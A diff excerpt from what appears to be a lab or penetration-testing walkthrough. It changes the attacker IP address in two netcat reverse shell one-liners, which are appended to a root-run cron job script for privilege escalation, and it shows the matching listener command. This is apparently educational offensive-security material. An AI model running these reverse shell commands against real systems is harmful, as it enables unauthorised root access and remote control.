@@ -244,11 +244,11 @@ sudo nc -nlvp 7777
 ### 8.3 Edit the cron job to have a reverse shell payload inside
 ```sh
 # NOTE: You will use your IP address of your Kali
-echo "rm /tmp/pipe; mkfifo /tmp/pipe; nc 192.168.0.2 7777 0</tmp/pipe | /bin/sh >/tmp/pipe 2>&1" >> cuiteur-cleaning
+echo "rm /tmp/pipe; mkfifo /tmp/pipe; nc 192.168.0.13 7777 0</tmp/pipe | /bin/sh >/tmp/pipe 2>&1" >> cuiteur-cleaning
 ```
 <!-- 
 # Alternative reverse shell payload
-# echo "rm /tmp/pipe; mkfifo /tmp/pipe; cat /tmp/pipe | /bin/sh -i 2>&1 | nc 192.168.0.2 7777 > /tmp/pipe" >> cuiteur-cleaning
+# echo "rm /tmp/pipe; mkfifo /tmp/pipe; cat /tmp/pipe | /bin/sh -i 2>&1 | nc 192.168.0.13 7777 > /tmp/pipe" >> cuiteur-cleaning
 -->
 - The cron job will be automatically executed in a few minutes with root privileges
 ### 8.4 Execute some OS commands through the `nc` connection
